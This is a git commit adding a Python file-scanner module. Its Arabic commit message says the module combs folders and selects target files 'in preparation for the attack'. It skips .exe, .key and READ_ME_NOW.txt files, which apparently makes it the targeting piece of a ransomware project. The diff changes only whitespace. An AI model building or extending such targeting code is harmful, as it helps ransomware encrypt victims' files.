f8681f9438ea8ee87486c0fe6cce2b5960c57f9b
hanan-hasan <hananba776@gmail.com>
2026-02-02 13:20:21 +0300

    Add files via upload
    (Scanner)انا حنان مسؤولة عن برمجة نظام الفحص
    .الكود الخاص بي يقوم بتمشيط المجلدات وتحديد الملفات المستهدفة بدقة لاستعداد الهجوم

--- Hanan_Scanner.py
+++ Hanan_Scanner.py
@@ -1,5 +1,6 @@
 import os
 
+
 # ==========================================
 # Developer: Hanan
 # Module: File System Scanner
@@ -10,7 +11,7 @@ def get_target_files(target_path):
     وظيفة حنان: البحث عن الملفات المستهدفة في المسار المحدد
     """
     files_list = []
-    
+
     # التأكد من وجود المجلد
     if os.path.exists(target_path):
         print(f"[Hanan-Scanner] Scanning directory: {target_path}...")
@@ -18,12 +19,11 @@ def get_target_files(target_path):
             full_path = os.path.join(target_path, filename)
             # استبعاد ملفات النظام والبرامج
             if os.path.isfile(full_path) and not filename.endswith(".exe") \
-               and not filename.endswith(".key") and not filename.endswith("READ_ME_NOW.txt"):
+                    and not filename.endswith(".key") and not filename.endswith("READ_ME_NOW.txt"):
                 files_list.append(full_path)
                 print(f"[Hanan-Scanner] Target found: {filename}")
     else:
         print(f"[Hanan-Scanner] Error: Path not found -> {target_path}")
-        
-    return files_list
 
+    return files_list
 
